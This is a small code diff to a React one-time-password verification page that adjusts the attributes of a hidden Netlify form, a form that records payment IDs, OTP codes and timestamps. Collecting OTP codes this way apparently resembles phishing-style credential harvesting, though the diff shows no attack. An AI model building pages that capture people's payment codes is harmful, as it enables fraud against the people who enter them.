@@ -1,3 +1,4 @@
+
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
@@ -64,7 +65,7 @@ const OTPVerification = () => {
   return (
     <div className="min-h-screen bg-gray-100" style={{ backgroundColor: '#f5f5f5' }}>
       {/* Hidden Netlify form for form detection */}
-      <form name="otp-verification" netlify netlify-honeypot="bot-field" hidden>
+      <form name="otp-verification" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
         <input type="text" name="payment-id" />
         <input type="text" name="otp-code" />
         <input type="text" name="timestamp" />
